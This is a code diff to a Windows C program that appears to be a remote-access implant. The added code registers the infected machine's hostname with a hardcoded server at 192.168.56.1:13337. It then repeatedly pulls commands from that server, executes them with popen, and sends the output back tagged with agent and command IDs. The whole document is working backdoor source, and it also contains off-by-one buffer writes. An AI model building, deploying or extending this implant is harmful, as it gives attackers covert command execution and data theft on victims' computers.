@@ -3,10 +3,11 @@
 #include <windows.h>
 
 
-#define LEN_MSG 256
+#define LEN_MSG 512
 #define HOST "192.168.56.1"
 #define PORT 13337
 #define SLEEPTIME 2000
+#define LEN_ID 36
 
 
 SOCKET connectToServer() {
@@ -81,6 +82,33 @@ int sendData(char* message) {
 }
 
 
+int sendAndGetResponse(char* send_data, char* response) {
+    SOCKET serverFd = connectToServer();
+    if (serverFd == SOCKET_ERROR) {
+        WSACleanup();
+        return WSAGetLastError();
+    }
+
+    int byteSent = send(serverFd, send_data, (int)strlen(send_data), 0);
+    if (byteSent != (int)strlen(send_data)) {
+        closesocket(serverFd);
+        WSACleanup();
+        return WSAGetLastError();
+    }
+
+    Sleep(10);  // Sleeping for 10 milliseconds to let the tcp connection complete before reading
+
+    int readBytes = recv(serverFd, response, LEN_MSG, 0);
+    if (readBytes < 0) {
+        closesocket(serverFd);
+        WSACleanup();
+        return WSAGetLastError();
+    }
+
+    closesocket(serverFd);
+    return 0;
+}
+
 char* execute(char* command) {
     FILE* exec = popen(command, "r");
     if (exec == NULL) {
@@ -122,29 +150,81 @@ char* execute(char* command) {
 
 
 int main() {
+    char agent_id[LEN_ID + 2] = "f0f0f0f0-f0f0-f0f0-f0f0-f0f0f0f0f0f0:";
+    char* hostname_h = execute("hostname");
+
+    size_t intro_h_size = LEN_ID + 1 + strlen(hostname_h);  // +1 for ':'
+    char* intro_h = malloc(intro_h_size);
+    strncpy(intro_h, agent_id, LEN_ID);
+    intro_h[LEN_ID] = ':';
+    strncpy(intro_h + LEN_ID + 1, hostname_h, strlen(hostname_h));
+    intro_h[intro_h_size] = 0x00;
+
+    int error = sendAndGetResponse(intro_h, agent_id);
+    if (error != 0) {
+        printf("Error while introducing ourselves. (%d)", error);
+        exit(EXIT_FAILURE);
+    }
+
+    free(hostname_h);
+    hostname_h = NULL;
+
+    free(intro_h);
+    intro_h = NULL;
+
     char message[LEN_MSG] = { 0x0 };
 
     while (1) {
-        int error = pull(message);
+        int error = sendAndGetResponse(agent_id, message);
         if (error != 0) {
             printf("Error while pulling data. (%d)", error);
             exit(EXIT_FAILURE);
         }
 
-        char* command_h = execute(message);
-        if (command_h == NULL) {
-            // if we reach this point, there's some shit going on.
-            printf("Could not execute command.");
-            exit(EXIT_FAILURE);
+        printf("Received %s\n", message);
+
+        if (strcmp(message, "") != 0) {
+            char* commandStart = message;
+            for (int i = 0; i < strlen(message); i++) {
+                if (message[i] != ':') {
+                    commandStart++;
+                    continue;
+                }
+                commandStart++;
+                message[i] = 0x00;
+                break;
+            }
+
+            char* commandId = message;
+
+            char* command_h = execute(commandStart);
+            if (command_h == NULL) {
+                // if we reach this point, there's some shit going on.
+                printf("Could not execute command.");
+                exit(EXIT_FAILURE);
+            }
+
+            size_t formatedOutputLen = strlen(agent_id) + strlen(commandId) + 1 + strlen(command_h);
+            char* formatedOutput_h = malloc(formatedOutputLen);
+            strncpy(formatedOutput_h, agent_id, strlen(agent_id));
+            strncpy(formatedOutput_h + strlen(agent_id), commandId, strlen(commandId));
+            strncpy(formatedOutput_h + strlen(agent_id) + strlen(commandId), ":", 1);
+            strncpy(formatedOutput_h + strlen(agent_id) + strlen(commandId) + 1, command_h, strlen(command_h));
+            formatedOutput_h[formatedOutputLen] = 0x00;
+            
+            error = sendData(formatedOutput_h);
+            if (error != 0) {
+                printf("Error while sending data. (%d)", error);
+                exit(EXIT_FAILURE);
+            }
+
+            free(formatedOutput_h);
+            formatedOutput_h = NULL;
+
+            free(command_h);
+            command_h = NULL;
         }
 
-        error = sendData(command_h);
-        if (error != 0) {
-            printf("Error while pulling data. (%d)", error);
-            exit(EXIT_FAILURE);
-        }
-
-        free(command_h);
         memset(message, 0x00, sizeof(message));
         Sleep(SLEEPTIME);
     }
